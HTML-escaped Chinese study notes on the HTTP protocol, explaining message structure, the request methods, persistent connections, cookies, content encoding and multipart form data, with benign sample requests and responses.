&lt;p&gt;&lt;strong&gt;具体示例:&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; data-src=&#34;C:%5CUsers%5Clin%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20241004232536517.png&#34; alt=&#34;image-20241004232536517&#34; /&gt;&lt;/p&gt;
&lt;p&gt;请求报文是由请求方法、请求 URI、协议版本、可选的请求首部字段和内容实体构成的。&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; data-src=&#34;C:%5CUsers%5Clin%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20241004232902905.png&#34; alt=&#34;image-20241004232902905&#34; /&gt;&lt;/p&gt;
&lt;p&gt;下面则是从客户端发送给某个 HTTP 服务器端的请求报文中的内容。&lt;/p&gt;
&lt;figure class=&#34;highlight http&#34;&gt;&lt;figcaption data-lang=&#34;HTTP&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token request-line&#34;&gt;&lt;span class=&#34;token method property&#34;&gt;GET&lt;/span&gt; &lt;span class=&#34;token request-target url&#34;&gt;/index.htm&lt;/span&gt; &lt;span class=&#34;token http-version property&#34;&gt;HTTP/1.1&lt;/span&gt;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;2&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token header&#34;&gt;&lt;span class=&#34;token header-name keyword&#34;&gt;Host&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;token header-value&#34;&gt;hackr.jp&lt;/span&gt;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;p&gt;接收到请求的服务器，会将请求内容的处理结果以响应的形式返&lt;br /&gt;
回。&lt;/p&gt;
&lt;figure class=&#34;highlight http&#34;&gt;&lt;figcaption data-lang=&#34;HTTP&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token response-status&#34;&gt;&lt;span class=&#34;token http-version property&#34;&gt;HTTP/1.1&lt;/span&gt; &lt;span class=&#34;token status-code number&#34;&gt;200&lt;/span&gt; &lt;span class=&#34;token reason-phrase string&#34;&gt;OK&lt;/span&gt;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;2&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token header&#34;&gt;&lt;span class=&#34;token header-name keyword&#34;&gt;Date&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;token header-value&#34;&gt;Tue, 10 Jul 2012 06:50:15 GMT&lt;/span&gt;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;3&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token header&#34;&gt;&lt;span class=&#34;token header-name keyword&#34;&gt;Content-Length&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;token header-value&#34;&gt;362&lt;/span&gt;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;4&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token header&#34;&gt;&lt;span class=&#34;token header-name keyword&#34;&gt;Content-Type&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;token header-value&#34;&gt;text/html&lt;/span&gt;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;5&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token text-html&#34;&gt;&lt;span class=&#34;token tag&#34;&gt;&lt;span class=&#34;token tag&#34;&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;lt;&lt;/span&gt;html&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;&gt;&lt;/span&gt;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;6&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;……&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;p&gt;起始行开头的 HTTP/1.1 : 表示服务器对应的 HTTP 协议版本。&lt;/p&gt;
&lt;p&gt;紧挨着的 200 OK 表示请求的处理结果的状态码（status code）和原因&lt;br /&gt;
短语（reason-phrase）。下一行显示了创建响应的日期时间，是首部&lt;br /&gt;
字段（header field）内的一个属性。&lt;/p&gt;
&lt;p&gt;下一行显示了创建响应的日期时间，是首部字段（header field）内的一个属性。&lt;/p&gt;
&lt;p&gt;以一空行分隔之后的内容称为资源实体的主体（entity body）。&lt;/p&gt;
&lt;p&gt;HTTP 响应报文格式：响应报文基本上由协议版本、状态码（表示请求成功或失败的数字代&lt;br /&gt;
码）、用以解释状态码的原因短语、可选的响应首部字段以及实体主&lt;br /&gt;
体构成。&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; data-src=&#34;C:%5CUsers%5Clin%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20241004233637586.png&#34; alt=&#34;image-20241004233637586&#34; /&gt;&lt;/p&gt;
&lt;h3 id=&#34;23-http-是不保存状态的协议&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#23-http-是不保存状态的协议&#34;&gt;#&lt;/a&gt; 2.3 HTTP 是不保存状态的协议&lt;/h3&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; data-src=&#34;C:%5CUsers%5Clin%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20241006134435815.png&#34; alt=&#34;image-20241006134435815&#34; /&gt;&lt;/p&gt;
&lt;h3 id=&#34;24-请求-uri-定位资源&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#24-请求-uri-定位资源&#34;&gt;#&lt;/a&gt; 2.4 请求 URI 定位资源&lt;/h3&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; data-src=&#34;C:%5CUsers%5Clin%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20241006134504714.png&#34; alt=&#34;image-20241006134504714&#34; /&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;当客户端请求访问资源而发送请求时，需要将作为请求报文中的请求 URI 包含在内。&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; data-src=&#34;C:%5CUsers%5Clin%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20241006134642920.png&#34; alt=&#34;image-20241006134642920&#34; /&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;如果不是访问特定资源而是对服务器本身发起请求，可以用一个 * 来代替请求 URI。&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;以下示例是查询 HTTP 服务器端支持的 HTTP 方法种类。&lt;/p&gt;
&lt;figure class=&#34;highlight http&#34;&gt;&lt;figcaption data-lang=&#34;HTTP&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;OPTIONS * HTTP/1.1&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;h3 id=&#34;25-告知服务器意图的-http-方法&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#25-告知服务器意图的-http-方法&#34;&gt;#&lt;/a&gt; 2.5 告知服务器意图的 HTTP 方法&lt;/h3&gt;
&lt;p&gt;**&lt;strong&gt;GET: 获取资源&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;GET 方法用来请求访问已被 URI 识别的资源。指定的资源经服务器端解析后返回相应内容。&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; data-src=&#34;C:%5CUsers%5Clin%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20241006142139385.png&#34; alt=&#34;image-20241006142139385&#34; /&gt;&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; data-src=&#34;C:%5CUsers%5Clin%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20241006142155264.png&#34; alt=&#34;image-20241006142155264&#34; /&gt;&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; data-src=&#34;C:%5CUsers%5Clin%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20241006142201260.png&#34; alt=&#34;image-20241006142201260&#34; /&gt;&lt;/p&gt;
&lt;p&gt;**POST:** 传输实体主体&lt;/p&gt;
&lt;p&gt;POST 方法用来传输实体的主体。&lt;/p&gt;
&lt;p&gt;POST 和 GET 虽然都能传输实体，但一般不用 GET 方法进行传输，POST 的主要目的并不是获取响应主体内容。&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; data-src=&#34;C:%5CUsers%5Clin%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20241006142246261.png&#34; alt=&#34;image-20241006142246261&#34; /&gt;&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; data-src=&#34;C:%5CUsers%5Clin%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20241006142253953.png&#34; alt=&#34;image-20241006142253953&#34; /&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;PUT: 传输文件&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;PUT 方法用来传输文件。由于安全性问题，一般的 Web 网站不使用该方法。&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; data-src=&#34;C:%5CUsers%5Clin%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20241006142351306.png&#34; alt=&#34;image-20241006142351306&#34; /&gt;&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; data-src=&#34;C:%5CUsers%5Clin%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20241006142413769.png&#34; alt=&#34;image-20241006142413769&#34; /&gt;&lt;/p&gt;
&lt;p&gt;&lt;em&gt;(这里相应的意思是请求执行成功但无数据返回)&lt;/em&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;HEAD:&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;和 GET 方法一样，但不返回报文主体部分。&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; data-src=&#34;C:%5CUsers%5Clin%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20241006142757519.png&#34; alt=&#34;image-20241006142757519&#34; /&gt;&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; data-src=&#34;C:%5CUsers%5Clin%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20241006142811869.png&#34; alt=&#34;image-20241006142811869&#34; /&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;DELETE: 删除文件&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;和 PUT 一样由于安全原因一般 Web 网站不使用。&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; data-src=&#34;C:%5CUsers%5Clin%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20241006142916903.png&#34; alt=&#34;image-20241006142916903&#34; /&gt;&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; data-src=&#34;C:%5CUsers%5Clin%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20241006142929979.png&#34; alt=&#34;image-20241006142929979&#34; /&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;OPTIONS: 询问支持的方法&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; data-src=&#34;C:%5CUsers%5Clin%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20241006143033824.png&#34; alt=&#34;image-20241006143033824&#34; /&gt;&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; data-src=&#34;C:%5CUsers%5Clin%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20241006143043541.png&#34; alt=&#34;image-20241006143043541&#34; /&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;TRACE: 追踪路径&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;TRACE 方法是让 Web 服务器端将之前的请求通信环回给客户端的方法。发送请求时，在 Max-Forwards 首部字段中填入数值，每经过一个服务器端就将该数字减 1，当数值刚好减到 0 时，就停止继续传输，最后接收到请求的服务器端则返回状态码 200 OK 的响应。客户端通过 TRACE 方法可以查询到发送出去的请求是怎样被加密 / 篡改的。&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; data-src=&#34;C:%5CUsers%5Clin%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20241006143312999.png&#34; alt=&#34;image-20241006143312999&#34; /&gt;&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; data-src=&#34;C:%5CUsers%5Clin%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20241006143318695.png&#34; alt=&#34;image-20241006143318695&#34; /&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;CONNECT: 要求用隧道协议连接代理&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;CONNECT 方法要求在与代理服务器通信时建立隧道，实现用隧道协议进行 TCP 通信。主要使用 SSL (Secure Sockets Layer，安全套接层) 和 TLS (Transport Layer Security，传输层安全) 协议把通信内容加密后经网络隧道传输。&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-HTTP&#34;&gt;CONNECT 代理服务器名:端口号 HTTP版本
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; data-src=&#34;C:%5CUsers%5Clin%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20241006143458046.png&#34; alt=&#34;image-20241006143458046&#34; /&gt;&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; data-src=&#34;C:%5CUsers%5Clin%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20241006143503797.png&#34; alt=&#34;image-20241006143503797&#34; /&gt;&lt;/p&gt;
&lt;h3 id=&#34;26使用方法下达命令&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#26使用方法下达命令&#34;&gt;#&lt;/a&gt; 2.6 使用方法下达命令&lt;/h3&gt;
&lt;p&gt;这一块内容比较无关紧要。&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; data-src=&#34;C:%5CUsers%5Clin%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20241006143637556.png&#34; alt=&#34;image-20241006143637556&#34; /&gt;&lt;/p&gt;
&lt;h3 id=&#34;27持久连接节省通信量&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#27持久连接节省通信量&#34;&gt;#&lt;/a&gt; 2.7 持久连接节省通信量&lt;/h3&gt;
&lt;p&gt;在 HTTP 协议的初始版本中，每进行一次 HTTP 通信就要断开一次 TCP 连接，这意味着每次请求都会造成无谓的 TCP 连接建立和断开而增加通信量开销。&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; data-src=&#34;C:%5CUsers%5Clin%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20241006152833999.png&#34; alt=&#34;image-20241006152833999&#34; /&gt;&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; data-src=&#34;C:%5CUsers%5Clin%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20241006152910271.png&#34; alt=&#34;image-20241006152910271&#34; /&gt;&lt;/p&gt;
&lt;p&gt;因此出现了持久连接 (HTTP Persistent Connections，也称为 HTTP keep-alive 或&lt;br /&gt;
 HTTP connection reuse) 的方法。其特点为只要任意一段没有明确提出断开连接，则保持 TCP 连接状态，减轻了服务器的负载，提高 Web 页面的显示效率。&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; data-src=&#34;C:%5CUsers%5Clin%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20241006153130650.png&#34; alt=&#34;image-20241006153130650&#34; /&gt;&lt;/p&gt;
&lt;p&gt;持久连接使得多数请求以管线化方式发送成为可能。&lt;strong&gt;管线化技术&lt;/strong&gt;出现后，不用等待响应亦可直接发送下一个请求。&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; data-src=&#34;C:%5CUsers%5Clin%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20241006153247884.png&#34; alt=&#34;image-20241006153247884&#34; /&gt;&lt;/p&gt;
&lt;h3 id=&#34;28使用cookie的状态管理&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#28使用cookie的状态管理&#34;&gt;#&lt;/a&gt; 2.8 使用 Cookie 的状态管理&lt;/h3&gt;
&lt;p&gt;由于 HTTP 是无状态协议，它不会对之前发生过的请求和相应的状态进行管理。&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; data-src=&#34;C:%5CUsers%5Clin%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20241006153353937.png&#34; alt=&#34;image-20241006153353937&#34; /&gt;&lt;/p&gt;
&lt;p&gt;因此引入了&lt;strong&gt; Cookie 技术&lt;/strong&gt;。通过在请求和响应报文中写入 Cookie 信息来控制客户端状态。&lt;/p&gt;
&lt;p&gt;客户端保存由服务器端发送的响应报文中叫做 Set-Cookie 的首部字段信息，下次客户端再往该服务器发送请求时，客户端会自动在请求报文中加入 Cookie 值发出。服务器通过客户端发送的 Cookie 得到之前的状态信息。&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; data-src=&#34;C:%5CUsers%5Clin%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20241006153715476.png&#34; alt=&#34;image-20241006153715476&#34; /&gt;&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; data-src=&#34;C:%5CUsers%5Clin%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20241006153722313.png&#34; alt=&#34;image-20241006153722313&#34; /&gt;&lt;/p&gt;
&lt;p&gt;1. 请求报文 (无 Cookie 时状态)&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-Http&#34;&gt;GET /reader/ HTTP/1.1
Host: hackr.jp
*首部字段内没有Cookie的相关信息
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;2. 响应报文 (服务端生成 Cookie 信息)&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-HTTP&#34;&gt;HTTP/1.1 200 OK
Date: Thu, 12 Jul 2012 07:12:20 GMT
Server: Apache
＜Set-Cookie: sid=1342077140226724; path=/; expires=Wed,
10-Oct-12 07:12:20 GMT＞
Content-Type: text/plain; charset=UTF-8
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;3. 请求报文 (自动发送保存着的 Cookie 信息)&lt;/p&gt;
&lt;figure class=&#34;highlight http&#34;&gt;&lt;figcaption data-lang=&#34;HTTP&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token request-line&#34;&gt;&lt;span class=&#34;token method property&#34;&gt;GET&lt;/span&gt; &lt;span class=&#34;token request-target url&#34;&gt;/image/&lt;/span&gt; &lt;span class=&#34;token http-version property&#34;&gt;HTTP/1.1&lt;/span&gt;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;2&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token header&#34;&gt;&lt;span class=&#34;token header-name keyword&#34;&gt;Host&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;token header-value&#34;&gt;hackr.jp&lt;/span&gt;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;3&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token header&#34;&gt;&lt;span class=&#34;token header-name keyword&#34;&gt;Cookie&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;token header-value&#34;&gt;sid=1342077140226724&lt;/span&gt;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;h2 id=&#34;第三章&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#第三章&#34;&gt;#&lt;/a&gt; 第三章&lt;/h2&gt;
&lt;h3 id=&#34;31-32-http报文&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#31-32-http报文&#34;&gt;#&lt;/a&gt; 3.1-3.2 HTTP 报文&lt;/h3&gt;
&lt;p&gt;用于 HTTP 协议交互的信息被称为 HTTP 报文。求端（客户端）的 HTTP 报文叫做请求报文，响应端（服务器端）的叫做响应报文。HTTP 报文本身是由多行（用 CR+LF 作换行符）数据构成的字符串文本。&lt;/p&gt;
&lt;p&gt;HTTP 报文大致可分为报文首部和报文主体两块。两者由最初出现的空行（CR+LF）来划分。通常，并不一定要有报文主体。&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; data-src=&#34;C:%5CUsers%5Clin%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20241006165128464.png&#34; alt=&#34;image-20241006165128464&#34; /&gt;&lt;/p&gt;
&lt;p&gt;报文和响应报文的结构&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; data-src=&#34;C:%5CUsers%5Clin%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20241006165151102.png&#34; alt=&#34;image-20241006165151102&#34; /&gt;&lt;/p&gt;
&lt;p&gt;请求报文（上）和响应报文（下）的实例&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; data-src=&#34;C:%5CUsers%5Clin%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20241006165307378.png&#34; alt=&#34;image-20241006165307378&#34; /&gt;&lt;/p&gt;
&lt;p&gt;请求报文和响应报文的首部内容由以下数据组成:&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;请求行&lt;/strong&gt;：包含用于请求的方法，请求 URI 和 HTTP 版本。&lt;br /&gt;
&lt;strong&gt;状态行&lt;/strong&gt;：包含表明响应结果的状态码，原因短语和 HTTP 版本。&lt;br /&gt;
&lt;strong&gt;首部字段&lt;/strong&gt;：包含表示请求和响应的各种条件和属性的各类首部。一般有 4 种首部，分别是：通用首部、请求首部、响应首部和实体首部。(根据名称基本能够得出首部出现在对应的报文类型，通用首部请求和响应报文共有，实体首部约束实体相关的属性)&lt;/p&gt;
&lt;p&gt;** 其他:** 可能包含 HTTP 的 RFC 里未定义的首部（Cookie 等）&lt;/p&gt;
&lt;h3 id=&#34;33编码提升传输速率&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#33编码提升传输速率&#34;&gt;#&lt;/a&gt; 3.3 编码提升传输速率&lt;/h3&gt;
&lt;p&gt;HTTP 在传输数据时可以可以在传输过程中通过编码提升传输速率。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;报文主体和实体主体的差异&lt;/strong&gt;：报文是 HTTP 通信中的基本单位，由 8 位组字节流（字节流是指由 8 位字节组成的连续数据流）组成，通过 HTTP 通信传输。实体作为请求或响应的有效载荷数据 (补充项) 被传输，其内容由实体首部和实体主体组成。&lt;/p&gt;
&lt;p&gt;HTTP 报文的主体用于传输请求或响应的实体主体。通常，报文主体等于实体主体。只有当传输中进行编码操作时，实体&lt;br /&gt;
主体的内容发生变化，才导致它和报文主体产生差异。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;压缩传输的内容编码&lt;/strong&gt;：HTTP 协议常用的内容编码有以下几种：gzip（GNU zip）、compress（UNIX 系统的标准压缩）、deflate（zlib）、identity（不进行编码）&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; data-src=&#34;C:%5CUsers%5Clin%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20241006170218993.png&#34; alt=&#34;image-20241006170218993&#34; /&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;分割发送的分块传输编码&lt;/strong&gt;：HTTP 请求的编码实体资源尚未全部传输完成之前，浏览器无法显示请求页面。在传输大容量数据时，&lt;strong&gt;通过把数据分割成多块，能够让浏览器逐步显示页面。&lt;strong&gt;这种把实体主体分块的功能称为&lt;/strong&gt;分块传输编码&lt;/strong&gt;（Chunked Transfer Coding）。&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; data-src=&#34;C:%5CUsers%5Clin%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20241006170644942.png&#34; alt=&#34;image-20241006170644942&#34; /&gt;&lt;/p&gt;
&lt;h3 id=&#34;34-发送多种数据的多部分对象集合&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#34-发送多种数据的多部分对象集合&#34;&gt;#&lt;/a&gt; 3.4 发送多种数据的多部分对象集合&lt;/h3&gt;
&lt;p&gt;HTTP 协议中采纳了多部分对象集合，发送的一份报文主体内可含有多类型实体。通常是在图片或文本文件等上传时使用。&lt;br /&gt;
多部分对象集合包含的对象如下。&lt;br /&gt;
&lt;strong&gt;multipart/form-data&lt;/strong&gt;&lt;br /&gt;
 在 Web 表单文件上传时使用。&lt;br /&gt;
&lt;strong&gt;multipart/byteranges&lt;/strong&gt;&lt;br /&gt;
 状态码 206（Partial Content，部分内容）响应报文包含了多个范围的内容时使用。&lt;br /&gt;
&lt;strong&gt;multipart/form-data&lt;/strong&gt;&lt;/p&gt;
&lt;figure class=&#34;highlight http&#34;&gt;&lt;figcaption data-lang=&#34;HTTP&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token header&#34;&gt;&lt;span class=&#34;token header-name keyword&#34;&gt;Content-Type&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;token header-value&#34;&gt;multipart/form-data; boundary=AaB03x&lt;/span&gt;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;2&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;--AaB03x&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;3&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token header&#34;&gt;&lt;span class=&#34;token header-name keyword&#34;&gt;Content-Disposition&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;token header-value&#34;&gt;form-data; name=&#34;field1&#34;&lt;/span&gt;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;4&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;Joe Blow&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;5&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;--AaB03x&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;6&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token header&#34;&gt;&lt;span class=&#34;token header-name keyword&#34;&gt;Content-Disposition&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;token header-value&#34;&gt;form-data; name=&#34;pics&#34;; filename=&#34;file1.txt&#34;&lt;/span&gt;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;7&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token header&#34;&gt;&lt;span class=&#34;token header-name keyword&#34;&gt;Content-Type&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;token header-value&#34;&gt;text/plain&lt;/span&gt;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td 